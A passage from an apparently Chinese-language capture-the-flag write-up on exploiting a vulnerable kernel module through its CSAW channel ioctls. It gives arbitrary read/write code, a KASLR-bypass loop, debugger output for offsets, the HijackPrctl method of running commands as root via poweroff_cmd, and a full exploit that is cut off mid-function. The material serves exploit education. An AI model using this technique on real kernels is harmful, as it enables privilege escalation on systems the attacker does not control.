<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">item_read = using_list-&gt;item;</span><br><span class="line">data_read = (<span class="keyword">unsigned</span> __int64)item_read-&gt;data;</span><br><span class="line">copy_to_user(channel_from.user_ptr, &amp;item_read-&gt;buf[data_read], channel_from.size)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>item_seek</code> 和 <code>item_read</code> 都指向 <code>using_list-&gt;item</code>（是由 <code>alloc_new_ipc_channel</code> 进行分配的）</li>
<li>因此 <code>data_read == channel_from.user_ptr</code></li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序利用 CSAW_SEEK_CHANNEL 和 CSAW_WRITE_CHANNEL 可以完成局部任意写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item_seek-&gt;data = channel_from.user_ptr;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data_write = (<span class="keyword">unsigned</span> __int64)item_write-&gt;data;</span><br><span class="line">addr = (<span class="keyword">unsigned</span> __int64)&amp;item_write-&gt;buf[data_write];</span><br><span class="line">strncpy_from_user(addr, channel_from.user_ptr, channel_from.size)</span><br></pre></td></tr></table></figure>
<ul>
<li>首先 <code>data_write == channel_from.user_ptr</code></li>
<li>而 <code>item_write-&gt;buf</code> 是由 <code>_kmalloc</code> 申请出来的，理论上来说我们是不好泄露堆地址的，但是 <code>realloc_ipc_channel</code> 中有解决的办法：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf = (<span class="keyword">char</span> *)krealloc(channel-&gt;buf, size + <span class="number">1</span>, <span class="number">0x14000C0</span>LL);</span><br><span class="line"><span class="keyword">if</span> ( buf )</span><br><span class="line">&#123;</span><br><span class="line">    item-&gt;buf = buf; </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>size+1 == 0</code> 时，<code>krealloc</code> 会返回 NULL，同时被赋值给 <code>using_list-&gt;item-&gt;buf</code>（这就不需要考虑堆地址了）</li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">	</span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    write_channel.id = channel_id;</span><br><span class="line">    write_channel.buf = (<span class="keyword">char</span>*)write_buff;</span><br><span class="line">    write_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>可以用 HijackPrctl 在不提权的情况下获取 flag</p>
<p>HijackPrctl 的核心就是利用 <code>prctl</code> 系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">	<span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后跟进 <code>security_task_prctl</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> thisrc;</span><br><span class="line">	<span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">	hlist_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">		thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">		<span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">			rc = thisrc;</span><br><span class="line">			<span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>security_task_prctl</code> 中会定位到一个虚表里面去，并且第一个参数可控</li>
<li>劫持这里，然后调用 <code>prctl</code>，就可以实现任意代码执行</li>
</ul>
<p>利用程序漏洞实现的 WAA 可以轻松覆盖这里，但是有一个问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>security_task_prctl</code> 的第一个参数是 <code>int</code> 类型</li>
<li>为了执行 <code>commit_creds(prepare_kernel_cred(0))</code>，我们需要传入 <code>prepare_kernel_cred(0)</code> 的指针，但是在64位的系统中该指针会被 <code>int</code> 类型截断（32位就没有这个困扰）</li>
</ul>
<p>取而代之的是函数 <code>__orderly_poweroff</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">		pr_warn(<span class="string">&quot;Failed to start orderly shutdown: forcing the issue\n&quot;</span>);</span><br><span class="line">		emergency_sync();</span><br><span class="line">		kernel_power_off();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该函数会调用 <code>run_cmd</code>，进而调用 <code>call_usermoderhelper</code>（内核运行用户程序的一个 <code>api</code>，并且拥有 <code>Root</code> 的权限，如果我们能够控制性的调用它，就能以 <code>Root</code> 权限执行我们想要执行的程序）</li>
<li>参数 <code>poweroff_cmd</code> 是全局变量，可以修改</li>
</ul>
<p>因此 HijackPrctl 的大体步骤为：</p>
<ul>
<li>篡改 <code>poweroff_cmd</code> 使其等于我们预期执行的命令</li>
<li>篡改 <code>prctl_hook</code> 为 <code>orderly_poweroff</code>  </li>
<li>调用 <code>prctl</code></li>
</ul>
<p>为此我们需要先泄露 <code>kernel_base</code>：</p>
<ul>
<li>当我们有 RAA 任意读后，可以用爆破的形式泄露 VDSO 的 ELF 头文件</li>
<li>然后利用 VDSO和 <code>kernel_base</code> 相差不远的特性，泄露出内核基址</li>
</ul>
<p>把网上的模板拿来改一改就好了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(addr=<span class="number">0xffffffff80000000</span>; addr&lt;<span class="number">0xffffffffffffefff</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">    RAA(fd, channel_id, &amp;read_buff, addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (read_buff == <span class="number">0x010102464c457f</span>) &#123; <span class="comment">/* VDSO ELF头文件标志 */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find it: %p\n&quot;</span>,addr);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>接下来就是一些套路化的东西，但是这个消息获取的过程需要注意</li>
</ul>
<p><strong>信息获取</strong></p>
<p>先关闭 kaslr，开始调试内核：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms</span></span><br><span class="line"><span class="number">0000000000000000</span> A irq_stack_union </span><br><span class="line"><span class="number">0000000000000000</span> A __per_cpu_start</span><br><span class="line">ffffffffa3a00000 T startup_64</span><br><span class="line">ffffffffa3a00000 T _stext</span><br><span class="line">ffffffffa3a00000 T _text</span><br><span class="line">ffffffffa3a00030 T secondary_startup</span><br></pre></td></tr></table></figure>
<ul>
<li><code>kernel_base == 0xffffffffa3a00000</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># grep security_task_prctl /proc/kallsyms</span></span><br><span class="line">ffffffffa3cbd410 T security_task_prctl</span><br><span class="line">/ <span class="meta"># grep poweroff_work_func /proc/kallsyms</span></span><br><span class="line">ffffffffa3a9c4c0 t poweroff_work_func</span><br></pre></td></tr></table></figure>
<ul>
<li><code>poweroff_work_func == 0xffffffffa3a9c4c0</code></li>
<li><code>poweroff_work_func_offset = 0xffffffffa3a9c4c0 - 0xffffffffa3a00000 = 0x9c4c0</code></li>
</ul>
<p>然后连接 GDB，打印 <code>security_task_prctl-ffffffffa3cbd410</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">30</span>iw <span class="number">0xffffffffa3cbd410</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd410</span>:	push   r15</span><br><span class="line">   <span class="number">0xffffffffa3cbd412</span>:	mov    r15d,<span class="number">0xffffffda</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd418</span>:	push   r14</span><br><span class="line">   <span class="number">0xffffffffa3cbd41a</span>:	mov    r14d,edi</span><br><span class="line">   <span class="number">0xffffffffa3cbd41d</span>:	push   r13</span><br><span class="line">   <span class="number">0xffffffffa3cbd41f</span>:	mov    r13,rsi</span><br><span class="line">   <span class="number">0xffffffffa3cbd422</span>:	push   r12</span><br><span class="line">   <span class="number">0xffffffffa3cbd424</span>:	mov    r12,rdx</span><br><span class="line">   <span class="number">0xffffffffa3cbd427</span>:	push   rbp</span><br><span class="line">   <span class="number">0xffffffffa3cbd428</span>:	mov    rbp,rcx</span><br><span class="line">   <span class="number">0xffffffffa3cbd42b</span>:	push   rbx</span><br><span class="line">   <span class="number">0xffffffffa3cbd42c</span>:	sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd430</span>:	mov    rbx,QWORD PTR [rip+<span class="number">0x14a4cc9</span>]        # <span class="number">0xffffffffa5162100</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd437</span>:	mov    QWORD PTR [rsp],r8</span><br><span class="line">   <span class="number">0xffffffffa3cbd43b</span>:	cmp    rbx,<span class="number">0xffffffffa5162100</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd442</span>:	je     <span class="number">0xffffffffa3cbd46f</span></span><br><span class="line">   <span class="number">0xffffffffa3cbd444</span>:	mov    r8,QWORD PTR [rsp]</span><br><span class="line">   <span class="number">0xffffffffa3cbd448</span>:	mov    rcx,rbp</span><br><span class="line">   <span class="number">0xffffffffa3cbd44b</span>:	mov    rdx,r12</span><br><span class="line">   <span class="number">0xffffffffa3cbd44e</span>:	mov    rsi,r13</span><br><span class="line">   <span class="number">0xffffffffa3cbd451</span>:	mov    edi,r14d</span><br><span class="line">   <span class="number">0xffffffffa3cbd454</span>:	call   QWORD PTR [rbx+<span class="number">0x18</span>] <span class="comment">/* target */</span></span><br></pre></td></tr></table></figure>
<p>在 <code>0xffffffffa3cbd454</code> 打断点，调试至此：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*RBX  <span class="number">0xffffffffa4c4fce8</span> —▸ <span class="number">0xffffffffa5162100</span> ◂— <span class="number">0xffffffffa4c4fce8</span></span><br><span class="line">*RIP  <span class="number">0xffffffffa3cbd454</span> ◂— call   qword ptr [rbx + <span class="number">0x18</span>]</span><br><span class="line">─────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0xffffffffa3cbd454</span>    call   qword ptr [rbx + <span class="number">0x18</span>]        &lt;<span class="number">0xffffffffa3a9c4c0</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>prctl_hook == 0xffffffffa4c4fd00</code></li>
<li><code>prctl_hook_offset = 0xffffffffa4c4fd00 - 0xffffffffa3a00000 = 0x124fd00</code></li>
</ul>
<p>然后连接 GDB，打印 <code>poweroff_work_func-ffffffffa3a9c4c0</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">30</span>iw <span class="number">0xffffffffa3a9c4c0</span></span><br><span class="line">   <span class="number">0xffffffffa3a9c4c0</span>:	push   rbx</span><br><span class="line">   <span class="number">0xffffffffa3a9c4c1</span>:	mov    rdi,<span class="number">0xffffffffa4c3d1e0</span></span><br><span class="line">   <span class="number">0xffffffffa3a9c4c8</span>:	movzx  ebx,BYTE PTR [rip+<span class="number">0x1670401</span>]        # <span class="number">0xffffffffa510c8d0</span></span><br><span class="line">   <span class="number">0xffffffffa3a9c4cf</span>:	call   <span class="number">0xffffffffa3a9c050</span> <span class="comment">/* 调用run_cmd */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第一个 call 就会调用 <code>run_cmd</code>，所以第一个参数 <code>poweroff_cmd == rdi</code></li>
<li><code>poweroff_cmd_offset = 0xffffffffa4c3d1e0 - 0xffffffffa3a00000 = 0x123d1e0</code></li>
</ul>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, 